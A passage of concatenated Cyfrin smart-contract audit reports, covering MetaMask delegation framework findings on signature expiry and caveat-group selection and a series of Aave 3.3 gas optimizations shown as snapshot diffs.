    bytes32 ethSignedMessageHash_ = MessageHashUtils.toEthSignedMessageHash(messageHash_);

    address recoveredSigner_ = ECDSA.recover(ethSignedMessageHash_, _signatureData.signature);
    if (recoveredSigner_ != swapApiSigner) revert InvalidApiSignature();
}
```

This implementation allows signatures to remain valid at the exact moment of their expiration timestamp, which creates ambiguity in the intended security model.

**Impact:** A signature marked as expired (with an expiration timestamp equal to the current block timestamp) is still considered valid, which may be counter-intuitive and could lead to confusion.

**Recommended Mitigation:** If the current behavior is intentional, consider renaming the `expiration` field to `validUpto`. Alternatively, to make it semantically clear with the term `expiration`, consider replacing `>` with `>=`.

**Metamask:** Resolved in commit [6912e73](https://github.com/MetaMask/delegation-framework/commit/6912e732e2ed65699152c6bfdb46a0ed433f1263).

**Cyfrin:** Resolved.

\clearpage

------ FILE END car/reports_md/2025-05-01-cyfrin-metamask-delegationFramework-part3-v2.0.md ------


------ FILE START car/reports_md/2025-05-07-cyfrin-metamask-delegationFramework-part4-v2.0.md ------

**Lead Auditors**

[0kage](https://twitter.com/0kage_eth)

**Assisting Auditors**



---

# Findings
## Informational


### Execution mode restriction in `LogicalOrWrapperEnforcer` can be removed

**Description:** The `LogicalOrWrapperEnforcer` contract currently includes the `onlyDefaultExecutionMode` modifier on all of its hook functions. This creates an unnecessary restriction since the individual enforcers being wrapped already apply their own execution mode restrictions. This design decision could limit the wrapper's flexibility and prevent it from working with caveats that might support non-default execution modes.


**Recommended Mitigation:** Consider removing the `onlyDefaultExecutionMode` modifier from all hook functions in the `LogicalOrWrapperEnforcer` and let the individual wrapped caveat enforcers handle their own execution mode restrictions.

Not only is this gas efficient, this change would also allow the `LogicalOrWrapperEnforcer` to be more flexible and forward-compatible with future caveats, while still maintaining the appropriate execution mode restrictions through the wrapped enforcer contracts themselves.

**Metamask:** Fixed in commit [d38d53d](https://github.com/MetaMask/delegation-framework/commit/d38d53dc467cc3b4faa7047cfca1844ea9cbc3be).

**Cyfrin:** Resolved.


### Delegate controlled privilege escalation risk in `LogicalOrWrapperEnforcer`

**Description:** When using the `LogicalOrWrapperEnforcer` enforcer, delegators may define multiple caveat groups with different security properties, expecting that all groups provide adequate security boundaries.

However, since delegates control which group is evaluated during execution, they can select the least restrictive group to bypass stricter security requirements defined in other groups.

For example, if a delegator defines two groups:

- Group 0: Requires minimum balance change of 100 tokens
- Group 1: Requires minimum balance change of 50 tokens

A delegate can choose Group 1 at execution time, allowing them to transfer only 50 tokens when the delegator may have expected the 100 token minimum to apply.

While this behavior is by design, it creates a scenario where delegates can bypass intended security restrictions by selecting the least restrictive caveat group. Since this enforcer's behavior gives such control to the delegate, it effectively allows them to elevate their privileges to the least restrictive option available across all defined groups.

**Recommended Mitigation:** Consider adding a security notice similar to the one added in all balance change enforcers.

```solidity
/**
 * @dev Security Notice: This enforcer allows delegates to choose which caveat group to use at execution time
 * via the groupIndex parameter. If multiple caveat groups are defined with varying levels of restrictions,
 * delegates can select the least restrictive group, bypassing stricter requirements in other groups.
 *
 * To maintain proper security:
 * 1. Ensure each caveat group represents a complete and equally secure permission set
 * 2. Never assume delegates will select the most restrictive group
 * 3. Design caveat groups with the understanding that delegates will choose the path of least resistance
 *
 * Use this enforcer at your own risk and ensure it aligns with your intended security model.
 */
```


**Metamask:** Fixed in commit [d38d53d](https://github.com/MetaMask/delegation-framework/commit/d38d53dc467cc3b4faa7047cfca1844ea9cbc3be).

**Cyfrin:** Resolved.


\clearpage

------ FILE END car/reports_md/2025-05-07-cyfrin-metamask-delegationFramework-part4-v2.0.md ------


------ FILE START car/reports_md/2025-05-08-cyfrin-gas-aave3.3-v1.0.md ------

**Lead Auditors**

[Dacian](https://x.com/DevDacian)
**Assisting Auditors**

 


---

# Findings
## Gas Optimization


### Cache `currentReserve.configuration` in `GenericLogic::calculateUserAccountData`

**Description:** Cache `currentReserve.configuration` in `GenericLogic::calculateUserAccountData` as this is a `view` function which doesn't change state.

**Impact:** `snapshots/Pool.Setters.json`:
```diff
-  "setUserEMode: enter eMode, 1 borrow, 1 supply": "140836",
-  "setUserEMode: leave eMode, 1 borrow, 1 supply": "112635",
+  "setUserEMode: enter eMode, 1 borrow, 1 supply": "140695",
+  "setUserEMode: leave eMode, 1 borrow, 1 supply": "112494",
```

`snapshots/Pool.Operations.json`:
```diff
-  "borrow: first borrow->borrowingEnabled": "256480",
-  "borrow: recurrent borrow": "249018",
+  "borrow: first borrow->borrowingEnabled": "256479",
+  "borrow: recurrent borrow": "248877",
  "flashLoan: flash loan for one asset": "197361",
-  "flashLoan: flash loan for one asset and borrow": "279057",
+  "flashLoan: flash loan for one asset and borrow": "279056",
  "flashLoan: flash loan for two assets": "325455",
-  "flashLoan: flash loan for two assets and borrow": "484439",
+  "flashLoan: flash loan for two assets and borrow": "484295",
  "flashLoanSimple: simple flash loan": "170603",
-  "liquidationCall: deficit on liquidated asset": "392365",
-  "liquidationCall: deficit on liquidated asset + other asset": "491921",
-  "liquidationCall: full liquidation": "392365",
-  "liquidationCall: full liquidation and receive ATokens": "368722",
-  "liquidationCall: partial liquidation": "383166",
-  "liquidationCall: partial liquidation and receive ATokens": "359520",
+  "liquidationCall: deficit on liquidated asset": "392223",
+  "liquidationCall: deficit on liquidated asset + other asset": "491638",
+  "liquidationCall: full liquidation": "392223",
+  "liquidationCall: full liquidation and receive ATokens": "368581",
+  "liquidationCall: partial liquidation": "383024",
+  "liquidationCall: partial liquidation and receive ATokens": "359378",
  "repay: full repay": "176521",
  "repay: full repay with ATokens": "173922",
  "repay: partial repay": "189949",
  "supply: first supply->collateralEnabled": "176366",
  "withdraw: full withdraw": "165226",
  "withdraw: partial withdraw": "181916",
-  "withdraw: partial withdraw with active borrows": "239471"
+  "withdraw: partial withdraw with active borrows": "239329"
```

**Recommended Mitigation:** See commit [3cd6639](https://github.com/devdacian/aave-v3-origin-liquidation-gas-fixes/commit/3cd663998a91906460b7e9175862ba3fe794efb1).


### Cache `usersConfig[params.user]` in `LiquidationLogic::executeLiquidationCall`

**Description:** In `LiquidationLogic::executeLiquidationCall`, `usersConfig[params.user]` can be cached and the copy can be safely passed to view functions `GenericLogic::calculateUserAccountData` and `ValidationLogic::validateLiquidationCall`.

A more intrusive optimization is to use and update the cached copy throughout the entire liquidation process, then write the copy to storage at the end. This has been implemented separately in G-06 as it is more intrusive.

**Impact:** `snapshots/Pool.Operations.json`:
```diff
-  "liquidationCall: deficit on liquidated asset": "392223",
-  "liquidationCall: deficit on liquidated asset + other asset": "491638",
-  "liquidationCall: full liquidation": "392223",
-  "liquidationCall: full liquidation and receive ATokens": "368581",
-  "liquidationCall: partial liquidation": "383024",
-  "liquidationCall: partial liquidation and receive ATokens": "359378",
+  "liquidationCall: deficit on liquidated asset": "392182",
+  "liquidationCall: deficit on liquidated asset + other asset": "491597",
+  "liquidationCall: full liquidation": "392182",
+  "liquidationCall: full liquidation and receive ATokens": "368539",
+  "liquidationCall: partial liquidation": "382983",
+  "liquidationCall: partial liquidation and receive ATokens": "359337",
```

**Recommended Mitigation:** See commit [4ce346c](https://github.com/devdacian/aave-v3-origin-liquidation-gas-fixes/commit/4ce346c4ba64667d049f2344cf2df9115d104c62).


### Cache `collateralReserve.configuration` in `LiquidationLogic::executeLiquidationCall`

**Description:** In `LiquidationLogic::executeLiquidationCall`, `collateralReserve.configuration` can be safely cached and passed to child functions saving many identical storage reads.

**Impact:** `snapshots/Pool.Operations.json`:
```diff
-  "liquidationCall: deficit on liquidated asset": "392182",
-  "liquidationCall: deficit on liquidated asset + other asset": "491597",
-  "liquidationCall: full liquidation": "392182",
-  "liquidationCall: full liquidation and receive ATokens": "368539",
-  "liquidationCall: partial liquidation": "382983",
-  "liquidationCall: partial liquidation and receive ATokens": "359337",
+  "liquidationCall: deficit on liquidated asset": "391606",
+  "liquidationCall: deficit on liquidated asset + other asset": "491021",
+  "liquidationCall: full liquidation": "391606",
+  "liquidationCall: full liquidation and receive ATokens": "367841",
+  "liquidationCall: partial liquidation": "382408",
+  "liquidationCall: partial liquidation and receive ATokens": "358639",
```

**Recommended Mitigation:** See commit [414dc2d](https://github.com/devdacian/aave-v3-origin-liquidation-gas-fixes/commit/414dc2d6cb9314bcda79cd72425407be75be22a6).


### Cache `collateralReserve.id` in `LiquidationLogic::executeLiquidationCall`

**Description:** In `LiquidationLogic::executeLiquidationCall`, `collateralReserve.id` can be safely cached and the copy passed to child functions.

**Impact:** `snapshots/Pool.Operations.json`:
```diff
-  "liquidationCall: deficit on liquidated asset": "391606",
-  "liquidationCall: deficit on liquidated asset + other asset": "491021",
-  "liquidationCall: full liquidation": "391606",
-  "liquidationCall: full liquidation and receive ATokens": "367841",
-  "liquidationCall: partial liquidation": "382408",
-  "liquidationCall: partial liquidation and receive ATokens": "358639",
+  "liquidationCall: deficit on liquidated asset": "391560",
+  "liquidationCall: deficit on liquidated asset + other asset": "490975",
+  "liquidationCall: full liquidation": "391560",
+  "liquidationCall: full liquidation and receive ATokens": "367673",
+  "liquidationCall: partial liquidation": "382476",
+  "liquidationCall: partial liquidation and receive ATokens": "358585",
```

**Recommended Mitigation:** See commit [a82d552](https://github.com/devdacian/aave-v3-origin-liquidation-gas-fixes/commit/a82d552a5bb901f9f4b0c81421f36953df686978).


### Use cached `vars.collateralAToken` in `LiquidationLogic::_liquidateATokens`

**Description:** Use cached `vars.collateralAToken` in `LiquidationLogic::_liquidateATokens`; there's no need to read it from storage again.

**Impact:** `snapshots/Pool.Operations.json`:
```diff
-  "liquidationCall: full liquidation and receive ATokens": "367673",
+  "liquidationCall: full liquidation and receive ATokens": "367553",
   "liquidationCall: partial liquidation": "382476",
-  "liquidationCall: partial liquidation and receive ATokens": "358585",
+  "liquidationCall: partial liquidation and receive ATokens": "358465",
```

**Recommended Mitigation:** See commit [f6af2e1](https://github.com/devdacian/aave-v3-origin-liquidation-gas-fixes/commit/f6af2e13b8e3b9960abb63ebb4eaeb82e271b718).


### Only read from and write to storage once for `usersConfig[params.user]` in `LiquidationLogic::executeLiquidationCall`

**Description:** `usersConfig[params.user]` can be read once at the start of `LiquidationLogic::executeLiquidationCall`, then the cached copy can be passed around using `memory` and modified as needed, and finally storage can be written once at the end of the function.

**Impact:** `snapshots/Pool.Operations.json`:
```diff
-  "liquidationCall: deficit on liquidated asset": "391560",
-  "liquidationCall: deficit on liquidated asset + other asset": "490975",
-  "liquidationCall: full liquidation": "391560",
-  "liquidationCall: full liquidation and receive ATokens": "367553",
-  "liquidationCall: partial liquidation": "382476",
-  "liquidationCall: partial liquidation and receive ATokens": "358465",
+  "liquidationCall: deficit on liquidated asset": "391305",
+  "liquidationCall: deficit on liquidated asset + other asset": "489972",
+  "liquidationCall: full liquidation": "391305",
+  "liquidationCall: full liquidation and receive ATokens": "367366",
+  "liquidationCall: partial liquidation": "382734",
+  "liquidationCall: partial liquidation and receive ATokens": "358795",
```

This change seems to benefit everything apart from partial liquidations where it results in slightly worse performance.

**Recommended Mitigation:** See commit [f419f3c](https://github.com/devdacian/aave-v3-origin-liquidation-gas-fixes/commit/f419f3c638401cef897a265ff0407da762e84021).


### Reduce memory usage and gas by using named return variables in `LiquidationLogic::_calculateAvailableCollateralToLiquidate`

**Description:** Reduce memory usage and gas by using named return variables in `LiquidationLogic::_calculateAvailableCollateralToLiquidate`.

**Impact:** `snapshots/Pool.Operations.json`:
```diff
-  "liquidationCall: deficit on liquidated asset": "391305",
-  "liquidationCall: deficit on liquidated asset + other asset": "489972",
-  "liquidationCall: full liquidation": "391305",
-  "liquidationCall: full liquidation and receive ATokens": "367366",
-  "liquidationCall: partial liquidation": "382734",
-  "liquidationCall: partial liquidation and receive ATokens": "358795",
+  "liquidationCall: deficit on liquidated asset": "391070",
+  "liquidationCall: deficit on liquidated asset + other asset": "489736",
+  "liquidationCall: full liquidation": "391070",
+  "liquidationCall: full liquidation and receive ATokens": "367131",
+  "liquidationCall: partial liquidation": "382507",
+  "liquidationCall: partial liquidation and receive ATokens": "358569",
```

**Recommended Mitigation:** See commit [af61e44](https://github.com/devdacian/aave-v3-origin-liquidation-gas-fixes/commit/af61e44a43c488ba1a3a569482a7fed18b8518c9).


### Remove memory struct `AvailableCollateralToLiquidateLocalVars` and use only local variables in `LiquidationLogic::_calculateAvailableCollateralToLiquidate`

**Description:** Using in-memory "context" structs to store variables is a nice trick to get around "stack too deep errors", but also uses significantly more gas than using local in-function variables.

When in-memory "context" structs are not required, it is cheaper to not use them. Hence remove memory struct `AvailableCollateralToLiquidateLocalVars` and use only local variables in `LiquidationLogic::_calculateAvailableCollateralToLiquidate`.

**Impact:** `snapshots/Pool.Operations.json`:
```diff
-  "liquidationCall: deficit on liquidated asset": "391070",
-  "liquidationCall: deficit on liquidated asset + other asset": "489736",
-  "liquidationCall: full liquidation": "391070",
-  "liquidationCall: full liquidation and receive ATokens": "367131",
-  "liquidationCall: partial liquidation": "382507",
-  "liquidationCall: partial liquidation and receive ATokens": "358569",
+  "liquidationCall: deficit on liquidated asset": "390891",
+  "liquidationCall: deficit on liquidated asset + other asset": "489556",
+  "liquidationCall: full liquidation": "390891",
+  "liquidationCall: full liquidation and receive ATokens": "366954",
+  "liquidationCall: partial liquidation": "382335",
+  "liquidationCall: partial liquidation and receive ATokens": "358397",
```

**Recommended Mitigation:** See commit [84d3925](https://github.com/devdacian/aave-v3-origin-liquidation-gas-fixes/commit/84d392575dfd0da6224a43500315962430455af0).


### Move 3 variables from `LiquidationCallLocalVars` struct into body of `LiquidationLogic::executeLiquidationCall`

**Description:** Similar to G-07, at least 3 variables can be moved from the in-memory "context" struct `LiquidationCallLocalVars` into the function body of `LiquidationLogic::executeLiquidationCall` without triggering "stack too deep" errors.

**Impact:** `snapshots/Pool.Operations.json`:
```diff
-  "liquidationCall: deficit on liquidated asset": "390891",
-  "liquidationCall: deficit on liquidated asset + other asset": "489556",
-  "liquidationCall: full liquidation": "390891",
-  "liquidationCall: full liquidation and receive ATokens": "366954",
-  "liquidationCall: partial liquidation": "382335",
-  "liquidationCall: partial liquidation and receive ATokens": "358397",
+  "liquidationCall: deficit on liquidated asset": "390795",
+  "liquidationCall: deficit on liquidated asset + other asset": "489459",
+  "liquidationCall: full liquidation": "390795",
+  "liquidationCall: full liquidation and receive ATokens": "366840",
+  "liquidationCall: partial liquidation": "382220",
+  "liquidationCall: partial liquidation and receive ATokens": "358265",
```

**Recommended Mitigation:** See commit [8bf12e2](https://github.com/devdacian/aave-v3-origin-liquidation-gas-fixes/commit/8bf12e272001306d07ba2ebf07ba2d3668792784).


### Used named return variables in `GenericLogic::calculateUserAccountData`

**Description:** Similar to G-7, cheaper to use named return variables in `GenericLogic::calculateUserAccountData`.

**Impact:** `snapshots/Pool.Operations.json`:
```diff
-  "borrow: first borrow->borrowingEnabled": "256479",
-  "borrow: recurrent borrow": "248877",
+  "borrow: first borrow->borrowingEnabled": "256117",
+  "borrow: recurrent borrow": "248451",
   "flashLoan: flash loan for one asset": "197361",
-  "flashLoan: flash loan for one asset and borrow": "279056",
+  "flashLoan: flash loan for one asset and borrow": "278694",
   "flashLoan: flash loan for two assets": "325455",
-  "flashLoan: flash loan for two assets and borrow": "484295",
+  "flashLoan: flash loan for two assets and borrow": "483384",
   "flashLoanSimple: simple flash loan": "170603",
-  "liquidationCall: deficit on liquidated asset": "390795",
-  "liquidationCall: deficit on liquidated asset + other asset": "489459",
-  "liquidationCall: full liquidation": "390795",
-  "liquidationCall: full liquidation and receive ATokens": "366840",
-  "liquidationCall: partial liquidation": "382220",
-  "liquidationCall: partial liquidation and receive ATokens": "358265",
+  "liquidationCall: deficit on liquidated asset": "390368",
+  "liquidationCall: deficit on liquidated asset + other asset": "489010",
+  "liquidationCall: full liquidation": "390368",
+  "liquidationCall: full liquidation and receive ATokens": "366414",
+  "liquidationCall: partial liquidation": "381793",
+  "liquidationCall: partial liquidation and receive ATokens": "357839",
-  "withdraw: partial withdraw with active borrows": "239329"
+  "withdraw: partial withdraw with active borrows": "238904"
```

**Recommended Mitigation:** See commit [f6f7cb6](https://github.com/devdacian/aave-v3-origin-liquidation-gas-fixes/commit/f6f7cb6c2ff160d722ebc25a6f121a59528f26a3).


### Remove 5 variables from context struct `CalculateUserAccountDataVars` used in `GenericLogic::calculateUserAccountData`

**Description:** Similar to G-7 and G-8, it is cheaper to remove these variables from the in-memory struct `CalculateUserAccountDataVars` without triggering a "stack too deep" error.

**Impact:** `snapshots/Pool.Operations`:
```diff
-  "borrow: first borrow->borrowingEnabled": "256117",
-  "borrow: recurrent borrow": "248451",
+  "borrow: first borrow->borrowingEnabled": "255807",
+  "borrow: recurrent borrow": "248112",
   "flashLoan: flash loan for one asset": "197361",
-  "flashLoan: flash loan for one asset and borrow": "278694",
+  "flashLoan: flash loan for one asset and borrow": "278384",
   "flashLoan: flash loan for two assets": "325455",
-  "flashLoan: flash loan for two assets and borrow": "483384",
+  "flashLoan: flash loan for two assets and borrow": "482657",
   "flashLoanSimple: simple flash loan": "170603",
-  "liquidationCall: deficit on liquidated asset": "390368",
-  "liquidationCall: deficit on liquidated asset + other asset": "489010",
-  "liquidationCall: full liquidation": "390368",
-  "liquidationCall: full liquidation and receive ATokens": "366414",
-  "liquidationCall: partial liquidation": "381793",
-  "liquidationCall: partial liquidation and receive ATokens": "357839",
+  "liquidationCall: deficit on liquidated asset": "390029",
+  "liquidationCall: deficit on liquidated asset + other asset": "488641",
+  "liquidationCall: full liquidation": "390029",
+  "liquidationCall: full liquidation and receive ATokens": "366075",
+  "liquidationCall: partial liquidation": "381454",
+  "liquidationCall: partial liquidation and receive ATokens": "357501",
-  "withdraw: partial withdraw with active borrows": "238904"
+  "withdraw: partial withdraw with active borrows": "238566"
```

**Recommended Mitigation:** See commits [01e1024](https://github.com/devdacian/aave-v3-origin-liquidation-gas-fixes/commit/01e10245711584b0fffad75029a2ce1ea1201498), [48d773e](https://github.com/devdacian/aave-v3-origin-liquidation-gas-fixes/commit/48d773e84d2f4a57422926b4d6246fb24f97a177).


### Use named returns in `ReserveLogic::cache` and `cumulateToLiquidityIndex`

**Description:** Using named returns in `ReserveLogic::cache` and `cumulateToLiquidityIndex` provides nice gas reductions across many functions.

**Impact:** `snapshots/Pool.Operations.json`:
```diff
-  "borrow: first borrow->borrowingEnabled": "255775",
-  "borrow: recurrent borrow": "248098",
-  "flashLoan: flash loan for one asset": "197361",
-  "flashLoan: flash loan for one asset and borrow": "278352",
-  "flashLoan: flash loan for two assets": "325455",
-  "flashLoan: flash loan for two assets and borrow": "482562",
-  "flashLoanSimple: simple flash loan": "170603",
-  "liquidationCall: deficit on liquidated asset": "390014",
-  "liquidationCall: deficit on liquidated asset + other asset": "488644",
-  "liquidationCall: full liquidation": "390014",
-  "liquidationCall: full liquidation and receive ATokens": "366060",
-  "liquidationCall: partial liquidation": "381439",
-  "liquidationCall: partial liquidation and receive ATokens": "357486",
-  "repay: full repay": "176521",
-  "repay: full repay with ATokens": "173922",
-  "repay: partial repay": "189949",
-  "repay: partial repay with ATokens": "185129",
-  "supply: collateralDisabled": "146755",
-  "supply: collateralEnabled": "146755",
-  "supply: first supply->collateralEnabled": "176229",
-  "withdraw: full withdraw": "165226",
-  "withdraw: partial withdraw": "181916",
-  "withdraw: partial withdraw with active borrows": "238552"
+  "borrow: first borrow->borrowingEnabled": "255438",
+  "borrow: recurrent borrow": "247760",
+  "flashLoan: flash loan for one asset": "197044",
+  "flashLoan: flash loan for one asset and borrow": "278015",
+  "flashLoan: flash loan for two assets": "324816",
+  "flashLoan: flash loan for two assets and borrow": "481887",
+  "flashLoanSimple: simple flash loan": "170288",
+  "liquidationCall: deficit on liquidated asset": "389335",
+  "liquidationCall: deficit on liquidated asset + other asset": "487617",
+  "liquidationCall: full liquidation": "389335",
+  "liquidationCall: full liquidation and receive ATokens": "365723",
+  "liquidationCall: partial liquidation": "380761",
+  "liquidationCall: partial liquidation and receive ATokens": "357148",
+  "repay: full repay": "176189",
+  "repay: full repay with ATokens": "173590",
+  "repay: partial repay": "189617",
+  "repay: partial repay with ATokens": "184797",
+  "supply: collateralDisabled": "146423",
+  "supply: collateralEnabled": "146423",
+  "supply: first supply->collateralEnabled": "175897",
+  "withdraw: full withdraw": "164894",
+  "withdraw: partial withdraw": "181583",
+  "withdraw: partial withdraw with active borrows": "238216"
```

**Recommended Mitigation:** See commit [f51ced5](https://github.com/devdacian/aave-v3-origin-liquidation-gas-fixes/commit/f51ced5571da85b33ca3ff4a109f9dfa2e84e87a).


### Misc used named returns to eliminate local variables or for `memory` returns

**Description:** Generally using named returns is more efficient either when it can remove a local variable and/or when the return is `memory`.

**Impact:** `snapshots/Pool.Operations.json`:
```diff
-  "borrow: first borrow->borrowingEnabled": "255438",
-  "borrow: recurrent borrow": "247760",
+  "borrow: first borrow->borrowingEnabled": "255409",
+  "borrow: recurrent borrow": "247710",
   "flashLoan: flash loan for one asset": "197044",
-  "flashLoan: flash loan for one asset and borrow": "278015",
+  "flashLoan: flash loan for one asset and borrow": "277986",
   "flashLoan: flash loan for two assets": "324816",
-  "flashLoan: flash loan for two assets and borrow": "481887",
+  "flashLoan: flash loan for two assets and borrow": "481858",
-  "repay: full repay": "176189",
-  "repay: full repay with ATokens": "173590",
-  "repay: partial repay": "189617",
-  "repay: partial repay with ATokens": "184797",
+  "repay: full repay": "176156",
+  "repay: full repay with ATokens": "173565",
+  "repay: partial repay": "189587",
+  "repay: partial repay with ATokens": "184775",
   "supply: collateralDisabled": "146423",
   "supply: collateralEnabled": "146423",
-  "supply: first supply->collateralEnabled": "175897",
+  "supply: first supply->collateralEnabled": "175868",
```

`snapshots/RewardsController.json`:
```diff
-  "claimAllRewards: one reward type": "50167",
-  "claimAllRewardsToSelf: one reward type": "49963",
-  "claimRewards partial: one reward type": "48299",
-  "claimRewards: one reward type": "48037",
-  "configureAssets: one reward type": "264184",
+  "claimAllRewards: one reward type": "50131",
+  "claimAllRewardsToSelf: one reward type": "49927",
+  "claimRewards partial: one reward type": "48250",
+  "claimRewards: one reward type": "47988",
+  "configureAssets: one reward type": "264175",
```

`snapshots/StataTokenV2.json`:
```diff
-  "claimRewards": "359669",
+  "claimRewards": "359522",
```

Note: there were more benefits as well from later commits.

**Recommended Mitigation:** See commits [ff2f190](https://github.com/devdacian/aave-v3-origin-liquidation-gas-fixes/commit/ff2f190e4454175b6594c3c4fc6aebd35461013e), [460e574](https://github.com/devdacian/aave-v3-origin-liquidation-gas-fixes/commit/460e5744635fe856320eebcfeeb8091211c59039), [47933e7](https://github.com/devdacian/aave-v3-origin-liquidation-gas-fixes/commit/47933e7e74c906fe475cfe8eb9fc2537bca30922), [2ad50db](https://github.com/devdacian/aave-v3-origin-liquidation-gas-fixes/commit/2ad50db0d160f2a45dca9dcbebb4b0931e356b71), [9e76a0b](https://github.com/devdacian/aave-v3-origin-liquidation-gas-fixes/commit/9e76a0b71aa1f523d4afdcc6be03bf184b7a2a7a), [757b9a7](https://github.com/devdacian/aave-v3-origin-liquidation-gas-fixes/commit/757b9a7a3825bd2bc596b11fd2bf51884f6ff5d9).


### Only read from and write to `userConfig` storage once in `SupplyLogic::executeWithdraw`

**Description:** Only read from and write to `userConfig` storage once in `SupplyLogic::executeWithdraw`.

**Impact:** `snapshots/Pool.Operations.json`:
```diff
-  "supply: first supply->collateralEnabled": "175868",
-  "withdraw: full withdraw": "164894",
-  "withdraw: partial withdraw": "181583",
-  "withdraw: partial withdraw with active borrows": "238208"
+  "supply: first supply->collateralEnabled": "175872",
+  "withdraw: full withdraw": "164728",
+  "withdraw: partial withdraw": "181499",
+  "withdraw: partial withdraw with active borrows": "237972"
```

**Recommended Mitigation:** See commit [ba371a8](https://github.com/devdacian/aave-v3-origin-liquidation-gas-fixes/commit/ba371a8dc77295dfe27a3c4b6b62d63213ec4a62).


### Cache `usersConfig[params.from]` in `SupplyLogic::executeFinalizeTransfer`

**Description:** Caching `usersConfig[params.from]` in `SupplyLogic::executeFinalizeTransfer` and putting `uint256 reserveId = reserve.id;` inside the `if` statement provides a gas reduction across a number of functions.

**Impact:** `snapshots/AToken.transfer.json`:
```diff
-  "full amount; sender: ->disableCollateral;": "103316",
-  "full amount; sender: ->disableCollateral; receiver: ->enableCollateral": "145062",
-  "full amount; sender: ->disableCollateral; receiver: dirty, ->enableCollateral": "132989",
+  "full amount; sender: ->disableCollateral;": "103282",
+  "full amount; sender: ->disableCollateral; receiver: ->enableCollateral": "145028",
+  "full amount; sender: ->disableCollateral; receiver: dirty, ->enableCollateral": "132955",
-  "partial amount; sender: collateralEnabled;": "103347",
-  "partial amount; sender: collateralEnabled; receiver: ->enableCollateral": "145093"
+  "partial amount; sender: collateralEnabled;": "103208",
+  "partial amount; sender: collateralEnabled; receiver: ->enableCollateral": "144954"
```

`snapshots/StataTokenV2.json`:
```diff
-  "depositATokens": "219313",
+  "depositATokens": "219279",
-  "redeemAToken": "152637"
+  "redeemAToken": "152498"
```

`snapshots/WrappedTokenGatewayV3.json`:
```diff
-  "withdrawETH": "258800"
+  "withdrawETH": "258766"
```

**Recommended Mitigation:** See commit [aba92d2](https://github.com/devdacian/aave-v3-origin-liquidation-gas-fixes/commit/aba92d2afb5c15275bd0b00cf844e26905020a5f).


### Cache `userConfig` in `BorrowLogic::executeBorrow`

**Description:** Cache `userConfig` in `BorrowLogic::executeBorrow`.

**Impact:** `snapshots/Pool.Operations.json`:
```diff
-  "borrow: first borrow->borrowingEnabled": "255409",
-  "borrow: recurrent borrow": "247710",
+  "borrow: first borrow->borrowingEnabled": "255253",
+  "borrow: recurrent borrow": "247555",
   "flashLoan: flash loan for one asset": "197044",
-  "flashLoan: flash loan for one asset and borrow": "277986",
+  "flashLoan: flash loan for one asset and borrow": "277830",
   "flashLoan: flash loan for two assets": "324816",
-  "flashLoan: flash loan for two assets and borrow": "481858",
+  "flashLoan: flash loan for two assets and borrow": "481547",
```

**Recommended Mitigation:** See commit [204a894](https://github.com/devdacian/aave-v3-origin-liquidation-gas-fixes/commit/204a894f194eecdb2ea8d32edc996e52501a988e).


### In `RewardsDistributor`, cache `storage` array lengths and when expected to read it `>= 3` times also for `memory`

**Description:** Cache array lengths for `storage` and when expected to read it `>= 3` times also for `memory`.

**Impact:** `snapshots/RewardsController.json`:
```diff
-  "getUserAccruedRewards: one reward type": "2182"
+  "getUserAccruedRewards: one reward type": "2090"
```

**Recommended Mitigation:** See commit [a3117ba](https://github.com/devdacian/aave-v3-origin-liquidation-gas-fixes/commit/a3117ba9a5a3e1eb7134219e1797c49168436484).



### Cache event emission parameters in `RewardsDistributor:::setDistributionEnd`, `setEmissionPerSecond`

**Description:** Cache event emission parameters in `RewardsDistributor:::setDistributionEnd`, `setEmissionPerSecond`.

**Impact:** `snapshots/RewardsController.json`:
```diff
-  "setDistributionEnd": "5972"
+  "setDistributionEnd": "5940"
-  "setEmissionPerSecond: one reward one emission": "11541"
+  "setEmissionPerSecond: one reward one emission": "11455"
```

**Recommended Mitigation:** See commits [8f488dc](https://github.com/devdacian/aave-v3-origin-liquidation-gas-fixes/commit/8f488dcc67a0a8469e1b0f99924d5653c03f92a9), [f516e0c](https://github.com/devdacian/aave-v3-origin-liquidation-gas-fixes/commit/f516e0c65b0940c5d8cfc8a23171e1f0eae598ee), [c932b96](https://github.com/devdacian/aave-v3-origin-liquidation-gas-fixes/commit/c932b96c7733c6f3fa5472c8895ebf39ae20df12), [38408b1](https://github.com/devdacian/aave-v3-origin-liquidation-gas-fixes/commit/38408b112b3bb4c2cf4b8581b6e7e484965bb282).


### Read and increment `availableRewardsCount` in same statement in `RewardsDistributor::_configureAssets`

**Description:** Read and increment `availableRewardsCount` in same statement in `RewardsDistributor::_configureAssets`.

**Impact:** `snapshots/RewardsController.json`:
```diff
-  "configureAssets: one reward type": "264175",
+  "configureAssets: one reward type": "263847",
```

**Recommended Mitigation:** See commit [654ecad](https://github.com/devdacian/aave-v3-origin-liquidation-gas-fixes/commit/654ecada3c3514f9c351258fa4a6c59ec2e93080).


### Exit quickly in `RewardsDistributor::_updateData` when `numAvailableRewards == 0`

**Description:** Exit quickly in `RewardsDistributor::_updateData` when `numAvailableRewards == 0` to avoid unnecessary work prior to exiting.

This optimization improves performance of any functions where the most common case is `numAvailableRewards = 0`, but results in worse performance when claiming rewards when `numAvailableRewards != 0`.

Hence it is a trade-off that should be considered based on what is the most likely case.

**Impact:** `snapshots/AToken.transfer.json`:
```diff
-  "full amount; receiver: ->enableCollateral": "144885",
-  "full amount; sender: ->disableCollateral;": "103282",
-  "full amount; sender: ->disableCollateral; receiver: ->enableCollateral": "145028",
-  "full amount; sender: ->disableCollateral; receiver: dirty, ->enableCollateral": "132955",
-  "full amount; sender: collateralDisabled": "103139",
-  "partial amount; sender: collateralDisabled;": "103139",
-  "partial amount; sender: collateralDisabled; receiver: ->enableCollateral": "144885",
-  "partial amount; sender: collateralEnabled;": "103208",
-  "partial amount; sender: collateralEnabled; receiver: ->enableCollateral": "144954"
+  "full amount; receiver: ->enableCollateral": "144757",
+  "full amount; sender: ->disableCollateral;": "103154",
+  "full amount; sender: ->disableCollateral; receiver: ->enableCollateral": "144900",
+  "full amount; sender: ->disableCollateral; receiver: dirty, ->enableCollateral": "132827",
+  "full amount; sender: collateralDisabled": "103011",
+  "partial amount; sender: collateralDisabled;": "103011",
+  "partial amount; sender: collateralDisabled; receiver: ->enableCollateral": "144757",
+  "partial amount; sender: collateralEnabled;": "103080",
+  "partial amount; sender: collateralEnabled; receiver: ->enableCollateral": "144826"
```

`snapshots/Pool.Operations.json`:
```diff
-  "borrow: first borrow->borrowingEnabled": "255253",
-  "borrow: recurrent borrow": "247555",
+  "borrow: first borrow->borrowingEnabled": "255189",
+  "borrow: recurrent borrow": "247491",

